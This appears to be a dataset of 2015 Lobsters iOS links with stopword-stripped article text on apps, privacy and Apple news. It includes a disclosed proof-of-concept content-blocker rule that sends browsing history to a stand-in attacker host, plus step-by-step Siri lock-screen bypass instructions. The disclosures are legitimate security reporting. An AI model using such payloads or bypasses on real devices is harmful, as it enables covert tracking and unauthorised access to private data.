set provisioning profile xcode project automatic always select correct profile secure expand key provisioning profile encrypted using openssl using passphrase storing private key git repo may sound offputting first indepth analysis potential security issue came following conclusion could happen someone stole private key attacker would certificate provisioning profile could codesign application bundle identifier worst could happen profile type app store profile app store profile ca nt used anything long resigned apple way get app resigned submit app review take around day attacker could submit app review also got access itunes connect credential stored git local keychain additionally get email notification every time build get uploaded cancel submission even app get review stage development ad hoc profile general profile harmless used install signed application small subset device add new device attacker would also need apple developer portal credential stored git local keychain enterprise profile attacker could use inhouse profile distribute signed application potentially unlimited number device would run company name could eventually lead apple revoking inhouse account however easy revoke certificate remotely break app device potentially dangerous nature inhouse profile please use match enterprise profile caution ensure git repository private use secure password sum full control access list git repo third party service involved even certificate leaked ca nt used cause harm without itunes connect login credential use inhouse enterprise profile match caution use github bitbucket encourage enabling factor authentication account access certificate repo
415,Lobsters,ios,Apple iOS,iOS 9 vulnerability: Content Blockers can track browser history,http://blog.appgrounds.com/content-blockers-track-browser-history/,io vulnerability content blocker track browser history,discovered vulnerability content blocker help friend could exploited leak user browsing history content blocker developer contrary apple claim impossible exploit work even private browsing allows malicious developer log time visited site reported exploit fixed io safari io version update writeup follows disclosure timeline http http http refine download blocker writeup content blocker work http apple claim vulnerability documentation proofofconcept conclusion sanitizing user input download app refine refineapp,discovered vulnerability content blocker help friend could exploited leak user browsing history content blocker developer contrary apple claim impossible exploit work even private browsing allows malicious developer log time visited site reported exploit fixed io safari io version update writeup follows disclosure timeline reported bug webkit bug tracker invalid cs selector body corrupting content blocking stylesheets response webkit team whole lot could case except better error reporting send email productsecurity applecom providing proof concept lack validation usersupplied cs selector allowed content blocker track user browsing history safari even user private browsing apple responds stating looking issue apple webkit developer reopen initial bug submit changeset webkit source fix vulnerability http apple push webkit update safari io safari disclose issue safari http io http publish blog post note develop free fully customizable content blocker io called refine audited refine public content blocker none exercise vulnerability default blocker certainly track user history want use featurerich content blocker developed someone care deeply user privacy security try mine hard tell whether content blocker tracking user history using exploit download blocker guarantee tracking browsing history continue help identify disclose vulnerability apple may jeopardize user privacy writeup content blocker work understand vulnerability content blocker need background work unlike adblockers desktop browser execute javascript behalf user content blocker far limited content blocking app merely provides json file contains rule type content blocked safari following format delineated http providing json file content blocking apps interact user experience safari browser responsible block content corresponding rule provided sort strict sandbox deliberately created part protect user browsing history app developer way impossible adblockers standard desktop browser like chrome apple claim safari content blocker support designed way content blocker send information developer site visit vulnerability proofofconcept let create content blocker send information developer site user visit safari documentation three way content blocker tell safari block content ask safari refuse load resource ask safari refuse send cooky loading resource ask safari hide html element match provided cs selector addition content blocker tell safari trigger certain blocking rule certain site filtering url site visited vulnerability could exploited asking safari hide html element providing cs selector per documentation cs selector passed json file safari would hide element matched cs selector unfortunately content blocking engine sanitize cs selector regular cs selector advertisement passed content blocking engine generates insert cs triggered website advertisement display none functioning webkit developer intended however try inserting real cs instead selector input body backgroundcolor blue webkit source generate body backgroundcolor blue display none valid cs already something webkit developer want allowing content blocker arbitrarily insert cs style sheet webpage case changing background color body element blue however bug becomes security vulnerability allows content blocker developer track user history coupling two fact trigger arbitrary stylesheets shown inserted specific webpage via urlfilter option passed json file using cs property background ask browser load external resource proofofconcept proofofconcept json file sent apple team demonstrating vulnerability action type cssdisplaynone selector body background url http attackercomvisitedyc trigger urlfilter ycombinatorcom action type cssdisplaynone selector body background url http attackercomvisitedreddit trigger urlfilter redditcom malicious content blocking app would attackercom send json file safari content blocking ruleset user visit redditcom safari try load http attackercomvisitedreddit user visit newsycombinatorcom safari try load http attackercomvisitedyc since attacker owns http attackercom track log user browser history way conclusion general sanitizing user input extremely important vulnerability serf example failure cause easy exploit disastrous consequence eg ability content blocker track user browsing history even private browsing want use free customizable content blocker developed someone care user privacy security download app refine follow refineapp twitter update ask question
416,Lobsters,ios,Apple iOS,"Announcing Focus by Firefox, a Content Blocker for iOS",https://blog.mozilla.org/futurereleases/2015/12/08/announcing-focus-by-firefox-a-content-blocker-for-ios/,announcing focus firefox content blocker io,feedback download install open source blocklist,today pleased announce launch focus firefox free content blocker safari user io give user greater control mobile web experience focus firefox put user control privacy allowing block category tracker used ad analytics social medium focus firefox may also increase performance reduce mobile data usage blocking web font welcome feedback explore way offer feature focus firefox future user download install focus firefox app store installed launching app provide guide finish configuration focus firefox block tracker blocked private browsing tracking protection firefox window mac linux android based disconnect open source blocklist currently focus firefox work safari firefox io chosen make content blocking unavailable third party browser io exploring provide feature firefox io deliver soon possible learn created focus firefox excited sharing release today already working making focus firefox even better future
417,Lobsters,ios,Apple iOS,Exploring the Product Design of the Stripe Dashboard for iPhone,https://medium.com/swlh/exploring-the-product-design-of-the-stripe-dashboard-for-iphone-e54e14f3d87e,exploring product design stripe dashboard iphone,vision wireframes http,visionwe spend lot time conceptualization phase even though first step product design never truly end carefully revisited timesour first meeting start white boarding start identifying feature part core experience define dashboard iphone app envisioned companion app focused two main use case rather fullfeatured version web dashboard app open first thing morning quickly review yesterday numbersa way able quickly look customer payment transfer informationwireframesafter defining feature work wireframes added difficulty working hour timezone difference order work around draw thing paper take picture record explanation wireframes send wait response example french http wireframes really rough visual refinement really flow overall user experience help u define expectation remind u want every screen
419,Lobsters,ios,Apple iOS,f.lux is no longer available for iOS,https://justgetflux.com/sideload/#notanymore,flux longer available io,flux longer available screen negatively influence sleep feedback apple written sideloading flux io xcode ingredient xcode flux io instruction visit forum discus faq bedtime mode,flux longer available november pst apple contacted u say flux io download previously available page violation developer program agreement method install longer available understood new xcode signing designed allow use apple indicated continue demand flux mobile device alltime high proven screen negatively influence sleep believe flux make significant improvement mirror closely research blocking blue light bed discovered even difficult conduct basic research area many people today use mobile device closed apis right bed sleep health connected literature obesity diabetes accident cancer mood disorder technology device know body could make major impact health wellness reason work every day flux free flux ship io app using documented apis apis use last year numerous conversation apple product would required make work io respect product enormously urge apple allow work like continue documented apis feedback apple written thank love support lorna sideloading flux io xcode xcode install apps directly io device free account apple decided make beta version flux people try step installing app store plenty harder thing even pinterest get flux installed io device download flux io use xcode ingredient mac osx greater installed version xcode developer account use appleid download flux io unzipped instruction first mix build ingredient together batter may slightly lumpy open project xcode open xcode preference account enter icloud developer credential target iflux general identity add word end bundle identifier make unique name place identity team select icloud account developer profile batter chill connect iphone ipad load iflux build xcode product menu choose destination select io device flux work simulator push cmdr ready flux first run prompted open setting general profile device trust developer account run allow location notification thing work well without loading app way automatic update bug fix version daily update check one available message appear bottom app stay date make fix welcome feedback beta release please let u know find issue feature request visit forum discus faq q screen waking flux wake screen make change best way know send notification see lot disallow notification turned instead asking device unlock wake screen quite security risk anything worried allow notification make hour reflect bedtime quite bit le annoying q screen locked want dark added bedtime mode without really finishing ui customize like prefer classicwindows sunrisesunset change wake time setting make better ui overall supposed look like candle sleeping use device middle night enjoy
420,Lobsters,ios,Apple iOS,Firefox released for iOS,https://itunes.apple.com/us/app/firefox-web-browser/id989804926?mt=8,firefox released io,,english afrikaans albanian angika arabic aragonese armenian asturian azerbaijani basque bengali bosnian breton bulgarian burmese cambodian catalan central atlas tamazight corsican croatian czech danish dutch esperanto filipino finnish french gaelic galician georgian german greek gujarati hebrew hindi hungarian icelandic indonesian interlingua irish italian japanese javanese kabyle kannada kazakh korean koyraboro senni songhai laotian latvian lithuanian lower sorbian malay malayalam marathi nepali norwegian bokm√•l norwegian nynorsk occitan oriya persian polish portuguese punjabi rhaetoromance romanian russian santali simplified chinese singhalese slovak slovenian spanish sudanese swedish tamil telugu thai tibetan traditional chinese turkish ukrainian upper sorbian urdu uzbek vietnamese welsh
421,Lobsters,ios,Apple iOS,Is Usability on Mobile Getting Worse?,http://ignorethecode.net/blog/2015/11/12/usability_on_mobile_getting_worse/,usability mobile getting worse,norman bruce tognazzini touch wow design work design sometime tap sometimes press harder make actually click exactly thing,norman bruce tognazzini legibility text one many design failure device lack discoverability way discover operation possible looking screen swipe left right one finger two even many five swipe tap tap single tap double text screen really text critically important button disguised text often user try touching everything screen find actually touchable object apple hardly company guilty true among worst offender touch iphone technically astonishingly impressive recent example apple steadfastly refused add second mouse button mac needlessly added one io platform never second mouse button nobody ever asked one really think overstated apple added hardware feature iphone whose sole purpose help developer add hidden feature apps get feeling apple added touch iphone incredibly cool make phone easier use wow design work design great way make design decision remember funny thought blackberry storm sometime tap sometimes press harder make actually click screen well iphone likewise people made fun window people found hard use first one genius decision put hidden feature behind edge swipe order figure find possible action window learn exactly one thing swipe side screen see option rule io android think people stop preoccupied thing like burger menu start worrying hidden interaction apple slightly lesser degree google adding mobile platform
422,Lobsters,ios,Apple iOS,Sideloading f.lux on iOS with Xcode 7,https://justgetflux.com/sideload/,sideloading flux io xcode,flux longer available screen negatively influence sleep feedback apple written sideloading flux io xcode ingredient xcode flux io instruction visit forum discus faq bedtime mode,flux longer available november pst apple contacted u say flux io download previously available page violation developer program agreement method install longer available understood new xcode signing designed allow use apple indicated continue demand flux mobile device alltime high proven screen negatively influence sleep believe flux make significant improvement mirror closely research blocking blue light bed discovered even difficult conduct basic research area many people today use mobile device closed apis right bed sleep health connected literature obesity diabetes accident cancer mood disorder technology device know body could make major impact health wellness reason work every day flux free flux ship io app using documented apis apis use last year numerous conversation apple product would required make work io respect product enormously urge apple allow work like continue documented apis feedback apple written thank love support lorna sideloading flux io xcode xcode install apps directly io device free account apple decided make beta version flux people try step installing app store plenty harder thing even pinterest get flux installed io device download flux io use xcode ingredient mac osx greater installed version xcode developer account use appleid download flux io unzipped instruction first mix build ingredient together batter may slightly lumpy open project xcode open xcode preference account enter icloud developer credential target iflux general identity add word end bundle identifier make unique name place identity team select icloud account developer profile batter chill connect iphone ipad load iflux build xcode product menu choose destination select io device flux work simulator push cmdr ready flux first run prompted open setting general profile device trust developer account run allow location notification thing work well without loading app way automatic update bug fix version daily update check one available message appear bottom app stay date make fix welcome feedback beta release please let u know find issue feature request visit forum discus faq q screen waking flux wake screen make change best way know send notification see lot disallow notification turned instead asking device unlock wake screen quite security risk anything worried allow notification make hour reflect bedtime quite bit le annoying q screen locked want dark added bedtime mode without really finishing ui customize like prefer classicwindows sunrisesunset change wake time setting make better ui overall supposed look like candle sleeping use device middle night enjoy
423,Lobsters,ios,Apple iOS,User data plundering by Android and iOS apps is as rampant as you suspected,http://arstechnica.com/security/2015/11/user-data-plundering-by-android-and-ios-apps-is-as-rampant-as-you-suspected/,user data plundering android io apps rampant suspected,enlarge google play apple app store imei enlarge,enlarge sampling thirdparty data sharing android apps image io apps looked similar apps google play apple app store frequently send user highly personal information third party often little notice according recently published research studied apps researcher analyzed popular apps market found significant percentage regularly provided google apple third party user email address name physical location average android apps sent potentially sensitive data thirdparty domain average io app sent thirdparty domain case health apps sent search including word herpes interferon fewer five domain notification happening result study point current permission system io android limited comprehensively inform user degree data sharing occurs author study titled know survey behind scene personal data sharing third party mobile apps wrote apps android io today need permission request notification user input like pii behavioral data personal information commonly transmitted android apps user email address percent apps studied sending data total percent android apps sent user name percent transmitted user current gps coordinate percent sent address percent sent phone imei detail app drugscom meanwhile sent medical search term herpes interferon five domain including doubleclicknet googlesyndicationcom intellitxtcom quantservecom scorecardresearchcom although domain nt receive personal information also concerning android apps sent third party potentially sensitive combination data facebook example received user name location seven apps analyzed well groupon pinterest runkeeper tango text free timehop domain appboycom received data app called glide researcher also noticed android apps tested connected domain safemovedmcom researcher wrote purpose domain connection unclear time however ubiquity curious used phone without running app connection domain continued may background connection made android operating system thus excluded table figure order avoid misattributing connection apps tested relative emptiness information flow sent safemovedmcom indicate possibility communication via port outside http captured mitmproxy enlarge web request made android phone littleknown safemovedmcom domaintechnology science google spokeswoman contacted post nt provide information safemovedmcom say android operating system would connect web search provided variety theory purpose android connection domain io apps meanwhile often sent third party user current location percent apps analyzed study transmitting data total percent apps sent name percent apps sent email address pinterest app sent name four thirdparty domain including yoziofacebookcom crittercismcom flurrycom several apps study sent sensitive information instance period tracker lite app track menstrual cycle transmitted symptom input insomnia apsalarcom jobsearch apps indeedcom snagajob shared employmentrelated input nurse car mechanic four domain including healthcareresourcecom googleanalyticscom scorecardresearchcom one thing app user safeguard personal information researcher suggest supply false data possible app request researcher also said apps redesigned allow user opt data collection app store could prominently inform user third party may receive data
425,Lobsters,ios,Apple iOS,Threema - Seriously secure messaging,https://threema.ch,threema seriously secure messaging,business solution threema work learn threema gateway learn threema broadcast learn,business solution everything need use threema organization threema work secure enterprise messaging solution offer convenient user management extensive app configuration option many feature tailored need organization learn threema gateway message api enables send receive threema message using software learn threema broadcast tool efficient topdown communication via feed distribution list bot centrally managed group learn
426,Lobsters,ios,Apple iOS,Turning the iPhone 6s Into a Digital Scale,https://medium.com/@warpling/turning-the-iphone-6s-into-a-digital-scale-f2197dc2b6e7#.viadvoc4g,turning iphone digital scale,turning iphone digital scale september september panorama app us vibration rotate phone magnetometerbased stud finder cameraflashbased heartrate monitor square ubiquitous headphonejack card reader september september iphone due arrive tomorrow needed object conductive fingerlike capacitance formed single fingerlike touch point household item could hold item spoon perfect solution looking september,turning iphone digital scaleseptember iphone announced brand new pressure sensitive hardware unveiled simple slightly vague api doc published soon question calling feature force touch touch remains unresolvedseptember friend chase mcbride call tech question rough translation startup idea chase friend brice tuttle talking idea scale app using touch first heard idea quick peek apis showed able simply place anything screen get force value app store friendly way get force value would touching screen finger even force returned would force directly fingerwe phone talking initial hurdle excitement turn concern start recalling time apple exactly stoked novel us device sensor remember despite app store speckled creative workarounds including panorama app us vibration rotate phone magnetometerbased stud finder cameraflashbased heartrate monitor even square ubiquitous headphonejack card reader creative solution waiting found creating scale turn impossible challengeseptember point know force value returned float range maximumpossibleforce average touch still know trigger touch without finger ideasi love decide going happen need preorder roughly five day phone hand meantime need build barebones testing app hit ground running need come way weigh object without touching screen without dead waterwith chase brice san francisco san luis obispo hop facetime channel inner macgyver brainstorm solution tried foil watch battery apple carrot coin even one point built meat basket piece salami stuck jar lid needle conductive handle pictured none solution fit trifecta convenient common nonperishablemeat basketseptember due arrive tomorrowas funny salami basket blindly coding something seemed doomed greasy clickbait headline burning moralewe thought problem needed object conductive fingerlike capacitance formed single fingerlike touch point household item could hold item capacitive common curved singlepoint contacta spoon perfect solution looking forgravity calibration screenseptember car drove induced mild panic attack none brown ups man finally arrived around dusk barely made across street traded squiggle signature ran back inside calibrated weight jar change digital scale laid preparation downloaded test app begin recording force value different number u nickel metal nickel nickel weight metal spoon dude perfectly linear force value linearly correlated weight turning force weight going simple recording force known weight creating linear regression even possible use statistic predict well calibration went many factor throw calibration opted use coin calibration framework made easy internationalize future
427,Lobsters,ios,Apple iOS,Wi-Fi Assist: a $5 Million Mess,https://medium.com/@istumbler/wi-fi-assist-a-5-million-mess-f10c4c65f2f#.49gyjcq28,wifi assist million mess,wifi assist million mess reporting wifi assist applecare bad problem number may reflect total download iphone comcast business class airport extreme tmobile lte network get mouthy software developer twitter performance improvement plan fix money bank u government measure measure cut ietf solitary confinement much,wifi assist million messapple insider reporting class action lawsuit filed apple california claiming damage unexpected usage metered data plan suit contends wifi assist feature introduced io cause updated device improperly download content lte connection user expects using wifii worked mac o wifi client user experience apple implementing number feature help user identify wifi connection working expected well utility built o help debug problem occurred left apple five year anniversary owned wifi utility network utility apps along assorted supporting component deep inside o last year spent lot time working closely applecare customer wifi networking issue poring user trouble report sitting call center listening call generally everything could improve user experience wifi apple usersi failed may possible succeed structure various team working wifi networking time made seemingly insurmountable challenge current situation make clear still force inside apple prevent kind real comprehensive solution implemented balkanization poor management uninformed decision executive contributed problem human limitation personal struggle played large part happen way continuehow bad problem well one user good way knowing widespread issue cellular data usage one app exclusively use home connected wifi video dl pro note number reflect recent billing cycle edit look number may reflect total download cellular make list poorly sorted misleading upgraded iphone release day home connected comcast business class cable connection faithfully using airport extreme base station enjoy idea notouch appliance internet accessnow heavy user tmobile lte network almost certainly customer unlimited plan tethering connected anywhere worry data charge happy pay service overage going cost anything million cellular data customer could easily led doubling tripling monthly billhow get much transpired still working apple discussed take confidentially seriously really matter one particular directorial edict pushed back end tenure stick particularly telling deeply misguided make selfhealing self healing context meaning networking system wifi particular try correct problem caused network fail spent time trying diagnose networking issue clear misunderstanding issue involvedyou see client rarely source problem networking internet connection work million miracle must happen second literally hundred specialized computer playing role access point router bridge gateway server c must correctly configured maintained monitored machine often take several role simultaneously thousand user time providing dhcp dns ip routing caching running dozen different protocol perfect concert hour day day year without failarmies surly administers watch limited budget long hour little sympathy constantly interrupted demand customer manager mouthy software developer twitter internet arguably largest single machine humanity ever created mind miracle work asking device connect vast complex network network detect transparently fix problem infrastructure without permission administrator well absolutely pinnacle buzzword driven product management real pointyhaired bos territorybut exactly request received despite clear set recommendation thing would help like think simple clear argument could done request eventually led put badge table front hr hit man assigned put performance improvement plan wifi assist represents possibly best client told self heal ditch network connection working wifi switch alternate lte paid service managed access network tends reliable wifi box got amazonhow fix phenomenon networking like call network support laser user call vendor wifi access point nearly entire profit margin box destroyed end call would paid hire support rep could actually fix problem script minimumwage often globalized support staff read screen instructs user call isp similarly isp support staff instructed defer many call possible ap vendor poor customer bounced back forth two explode exactly recipe customer satisfactionthis lack coordination visibility operation network two side distribution network one example communication break networking industry large powerful player market like apple could compel distribution network provider like comcast cooperate support organization resolve particular problem would clearly rather compete video delivery making sort arrangement difficult negotiatesimilarly lowcost lowmargin networking equipment typically deployed home small business le perfectly reliable local dns cache fails user might well internet service one common fix implemented network support configure client google anycast dns server whose ip address see spraypainted wall place network infrastructure attacked time unrest edit image turkey text read let bird speak reference twitter proposed management apple running server device use local isp dns server failed told executive would never approve expense provisioning running around time company money bank u governmentmeasure measure cutat end day problem networking solved better communication people build system work apple took ietf meeting saw first hand chain sausage internet made always pretty process generally work basis open discussion sharing ideasbut arrive solution understand often problem bad strongly end user react social animal restrict communication form punishment boyfriend girlfriend jerk give cold shoulder kid acting put timeout someone leak important government secret solitary confinementwifi assist attempt prevent end user feeling punished failure network high cost end user salve pain disconnected put user mercy cellular provider know well much willing pay forgo particular kind sufferingthe real solution group apple design implement support networking communicate better outside group management step comfortable nolimit data plan mindset consider cost emotional financial decision make end usersevery device apple make relies internet provide excellent user experience executive take networking connectivity seriously every level hardware network service severely limited deliver customer hard work go hardware software meaningless iphone mac watch tv worthless deliver best connectivity performance reliability industry massive investment network service powering icloud wasted client communicate themapple one company industry control entire value chain internet service wifi access point wifi client device required provide endtoend visibility network along influence resource make happen lack apparent
428,Lobsters,ios,Apple iOS,"How Much? ‚Äì The Smart, Offline Currency Converter for iOS and watchOS",http://gethowmuch.com,much smart offline currency converter io watchos,much smart currency converter know wrist pocket perfect excellent ux always know work without data keep currency rate date,much smart currency converter know wrist pocket perfect needed looking currency converter could use offline standing store market starting price tag nt even scroll list country find local currency automatically phone easy convenient thank excellent ux first put lack setting realized nt need setting app correct thing always know using gps much use correct currency based country work without data work even nt data often case travelling keep currency rate date silently update currency rate background data connection
430,Lobsters,ios,Apple iOS,Hackers Can Silently Control Siri (and Google Now) From 16 Feet Away,http://www.wired.com/2015/10/this-radio-trick-silently-hacks-siri-from-16-feet-away/,hacker silently control siri google foot away,paper published ieee leaving siri google enabled phone login screen represents security risk disable voice command function lock screen go back top skip start article,siri may personal assistant voice one listens group french researcher discovered siri also helpfully obeys order hacker talk case one silently transmitting command via radio far foot away pair researcher anssi french government agency devoted information security shown use radio wave silently trigger voice command android phone iphone google siri enabled also pair headphone microphone plugged jack clever hack us headphone cord antenna exploiting wire convert surreptitious electromagnetic wave electrical signal appear phone operating system audio coming user microphone without speaking word hacker could use radio attack tell siri google make call send text dial hacker number turn phone eavesdropping device send phone browser malware site send spam phishing message via email facebook twitter sky limit everything voice interface remotely discreetly electromagnetic wave possibility inducing parasitic signal audio frontend voicecommandcapable device could raise critical security impact two french researcher jos√© lope esteves chaouki kasmi write paper published ieee vincent strubel director research group anssi put simply sky limit everything voice interface remotely discreetly electromagnetic wave researcher work first presented hack paris conference summer received little notice outside french website us relatively simple collection equipment generates electromagnetic wave laptop running opensource software gnu radio usrp softwaredefined radio amplifier antenna smallest form researcher say could fit inside backpack setup range around six half foot powerful form requires larger battery could practically fit inside car van researcher say could extend attack range foot experimental setup kasmi esteves used hijack smartphones voice command radio wave jos√© lope esteves video showing attack action demo researcher commandeer google via radio android smartphone force phone browser visit anssi website experiment performed inside radiowaveblocking faraday cage researcher say abide french regulation forbid broadcasting certain electromagnetic frequency kasmi esteves say faraday cage necessary attack work browser support video researcher silent voice command hack serious limitation work phone microphoneenabled headphone earbuds plugged many android phone google enabled lockscreen set respond command recognizes user voice iphones siri enabled lockscreen default new version siri iphone verifies owner voice google another limitation attentive victim would likely able see phone receiving mysterious voice command cancel mischief complete researcher contend hacker could hide radio device inside backpack crowded area use transmit voice command surrounding phone many might vulnerable hidden victim pocket purse could imagine bar airport lot people say strubel sending electromagnetic wave could cause lot smartphones call paid number generate cash although latest version io handsfree feature allows iphone owner send voice command merely saying hey siri kasmi esteves say attack work older version operating system iphone headphone long button cord allows user enable siri long press reverse engineering spoofing electrical signal button press radio attack trigger siri lockscreen without interaction user mandatory alwayson voice interface say kasmi make phone vulnerable make attack le complex course security conscious smartphone user probably already know leaving siri google enabled phone login screen represents security risk least apple case anyone get handson access device long able use voice command feature squeeze sensitive information contact recent even hijack social medium account radio attack extends range stealth intrusion making important user disable voice command function lock screen anssi researcher say contacted apple google work recommended fix advise better shielding headphone cord would force attacker use higherpower radio signal instance electromagnetic sensor phone could block attack note attack could also prevented software letting user create custom wake word launch siri google using voice recognition block stranger command neither google apple yet responded wired inquiry anssi research without security feature kasmi esteves recommend smartphone voice feature could represent security attacker phone hand one hidden next room use phone keyboard need enter pin code voice interface listening time authentication say strubel main issue goal paper point failing security model est earlier version story stated siri verification owner voice fact feature introduced iphone apology error go back top skip start article
431,Lobsters,ios,Apple iOS,Apple Is Sweating the Details on iMac,https://medium.com/backchannel/exclusive-why-apple-is-still-sweating-the-details-on-imac-531a95e50c91,apple sweating detail imac,course proclaimed pc going like truck macintosh number,yeah agreed bergeron extended mac team since right like many reason apple world valuable company tim cook celebrated supply chain maester internalized focus innovation predecessor inculcated culture jony ive drawn global raf making apple design icon marketing branding practice set industry standard visit lab legacy product computer made suggests another reasonsweating detailsa lessthanperfect noise product killer even official bug nonetheless apple engineer determined make sure new imac magic mouse made better sound glided across desktopof course far imacs concerned larger question lingers even bother desktop computer month ago apple ceo tim cook showing new humongous ipad pro new keyboard proclaimed ipad clearest expression vision future personal computing make imacs relic fading past steve job foreshadowed question pc going like truck said conference may still going around one x people need could mobile age imacs even shiny new one dull engine computational load bearing phil schiller simple say phil schiller apple senior vp worldwide product marketing amazing time different idea competing computing life great love thought long deep choice want offer customer one ipad many thing want pc many people choose make primary computing device true ipad pro ever everybody people decide nothing thing need life well mac schiller fact grand philosophical theory apple product line put product continuum ideally using smallest possible gadget much possible going next largest gizmo line computer say one offering computer something unique made simple form pretty eternal job watch thing wrist need pick phone often job phone thing maybe need ipad always trying striving job ipad powerful capable never need notebook like need notebook add keyboard thing job notebook make never need desktop right decade leaf poor desktop end line job good question answer job challenge think computer thing computer ever done powerful capable need desktop capability say schiller competing notebook thinner lighter need brings u new imac product line despite fact apple revenue profit dominated iphone success still considers macintosh serious part business according schiller imac significant part apple break imac sale macintosh number lately bit five million per quarter sell ten time many iphones macintosh care deeply say apple vp macintosh product marketing brian croll company since
432,Lobsters,ios,Apple iOS,"Amazon stops selling Chromecast and Apple TV over Amazon Prime ""incompatability""",http://www.bloomberg.com/news/articles/2015-10-01/amazon-will-ban-sale-of-apple-google-video-streaming-devices,amazon stop selling chromecast apple tv amazon prime incompatability,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
433,Lobsters,ios,Apple iOS,How hackers can access iPhone contacts and photos without a password,http://arstechnica.com/security/2015/09/how-hackers-can-access-iphone-contacts-and-photos-without-a-password/,hacker access iphone contact photo without password,io version apple released wednesday,iphone user yet another screenlock bypass vulnerability watch according new video demonstration show bug exploited gain unauthorized access photo contact hack reportedly work io version apple released wednesday although people say unable reproduce vulnerability make possible someone get even brief moment iphone rifle contact photo without entering password action videobeware io io security flaw passcode bypass turn siri lockscreen safe work entering incorrect password four time immediately incorrect password entered fifth time attacker hold home button device lock attacker siri personal assistant pop attacker us bring inbuilt clock attacker tap clock press icon giving access search capability attacker get access imessage imessage attacker ability read delete add contact also way access photo stored device adding profile part phone remain offlimits bypass partial clear yet many people report hack work others say nt may sort configuration setting play far one seems identified rate partial bypass hack prevented preventing siri accessed lock screen access setting choose touch id passcode enter device password scroll allow access locked disable
437,Lobsters,ios,Apple iOS,Why There's No Sketch for the iPad,http://daringfireball.net/linked/2015/09/14/sketch-ipad,sketch ipad,sketch among ui designer,sketch welldone popular mac tool designer gained particular traction among ui designer one sketch developer replying thread designer news user hoping see version sketch ipad pro plan ipad pro version moment yes beautiful screen consider adapt ui touch without compromising experience biggest problem platform apps io sell unsustainably low price due lack trial port sketch ipad reasonable expectation earning back investment think single biggest problem holding back ipad apple see app store success many apps many downloads mac established ecosystem allows sustainable pricing including upgrade pricing professional tool sketch mac cost exception pro software sell sustainable price app store exception norm ipad five year old much pro software think hurting platform theory developer like bohemian coding maker sketch ipad pro reality staying away simply think make enough money justify cost development monday september
440,Lobsters,ios,Apple iOS,Proactive intelligence in iOS 9,http://www.computerworld.com/article/2973682/data-privacy/the-shocking-truth-about-proactive-intelligence-in-ios-9.html,proactive intelligence io,apple siri apple io flagship feature proactive thing like io iphone use apple handoff training remind buy milk way home today shocking truth google appleholic kool aid corner community got story drop line via twitter,apple nowworking alongside siri apple io flagship feature proactive try work want next try support help want doproactive thing like call contact regular time regular basis proactive start placing contact icon search screen around time think might make call visit gym regularly like play music see playing dialog appear lock screen connect headphone get gym call come unknown number contained within email received io let know might calling call come unknown landline number included email proactive tell number originates receive email containing reservation information flight restaurant event io create suggested calendar event begin write email multiple recipient io suggest people usually include similar group proactive learn display relevant realtime traffic update estimate long take reach destination use iphone car connect vehicle siri ask want continue listening thing listening last time drove use itaccessed swipe get proactive display left io home screen tapping shortcut logo bottom left corner apple device handoff also sits proactive screen contains series suggested contact based regularly speak list apps based frequently use tool find nearby service restaurant gas station news item based trending area software learns habit offer shortcut new thing thirdparty apps also offer proactive tool developer build support feature softwarein future proactive also share information upcoming flight local weather traffic warning relevant item information need feature enabled learn youtrainingproactive base information mean first install service provides limited contact recommendation skewed app recommendation faulty use better becometo make little easier siri io developed understanding concept like today tomorrow mean ask siri remind buy milk way home today siri try identify work drop reminder leaveshocking truthso information inside io privacy really want apple knowing go know work apple want keep private life privatethis unlike competitor want make money insight private life engineered proactive process data directly device rather cloud mean life become alphabetized telephone book surveillance sale sociopathic snoopingthe shocking thing apple execution feature prof real need sacrifice privacy convenience remain controlgoogle use social medium happen google user join appleholic kool aid corner community join conversation pursue spirit new model apple got story drop line via twitter comment let know like chose follow twitter let know fresh item published first computerworld
443,Lobsters,ios,Apple iOS,What's really happening with iOS 8 MAC address randomization?,http://www.imore.com/closer-look-ios-8s-mac-randomization,really happening io mac address randomization,supposed work seems work hubert seiwert isniff wwdc session user privacy worried learn,normally walking around wifienabled device connected network broadcasting probe order try find known network probe would sent using phone wifi mac address unique normally persistent value mean anybody monitoring probe say department store example persistently track store across multiple visit information nt tied personal identity lot information shopping habit could gleaned data analytics company user nt thrilled say remember nt iphone thing wifi thing device apple decided could better supposed work starting io device supposed randomize mac address broadcasting wifi probe o responsible creating random locally administered mac address hope long nt connecting wireless access point device ca nt used track anymore wifi probe range limited somebody wanting track presence movement device would need relatively close proximity one place seen device like used department store monitor shopping habit customer new random mac address periodically generated device would longer persistent token passive monitor track device seems work unfortunately look like apple change behavior probe nt quite hoped couple week ago representative indoor navigation location analytics company gisi indoors reached u saying testing change functionality every io beta yet see work fired wireshark take look sure enough saw device gleefully firing wifi probe using real mac address nt alone security researcher hubert seiwert responsible tool isniff saw behavior initially looked mac randomization nt work confusing apple made point publicize feature lot digging lot late night monitoring wireshark capture look like apple shipped feature advertised quite expected wwdc session user privacy slide said mac address used wifi scan may always device real universal address nt say would never device real mac may always last week analytics company airtight wireless published extremely detailed report testing io mac randomization found similar result nt read yet strongly encourage go take look testing seems extensive though finding nt completely align testing found order mac randomization functionality work supported io device must meet two criterion first device must connected wifi make sense second device must asleep airtight concluded location service cellular service also disabled taking close look nt think case think happening device must asleep requirement make difficult tell going monitoring traffic iphone running io able observe wifi probe sent randomized mac address location service cellular service enabled problem cellular connection phone nt tend stay asleep long even screen asleep phone may example receives new email via push even notification turned phone wake email come despite screen staying unfortunately requirement phone asleep make feature nearly useless albeit within description apple advertised wwdc order get random mac used turn notification multiple apps turn push email stay late night greater chance phone getting sleep uninterrupted minute two even circumstance would encounter one two round probe beacon seem go every couple minute random mac seeing phone blast bunch probe real mac best guess would happen process push woken device cellular data turned probe saw go randomly assigned mac rendering feature even useless probe request went random mac probe contained ssids network phone previously connected mean even mac random ssids broadcasting act fingerprint phone mac different every time probe go broadcast set network name every minute may still possible monitor track device worried ultimately feature nt something apple something decided help user privacy great idea theory execution seems fallen short anything really useful user nt worse io information still nt tie directly person give company individual ability track anonymous person without consent primarily useful store marketer analytics company analyzing trend habit consumer ideally something user control data effectively amount information u final say use data hopefully apple make adjustment mac randomization occurs increase scenario iphone real mac address used practical many people looking avoid tracked meantime disable wifi enable airplane mode may earn commission purchase using link learn
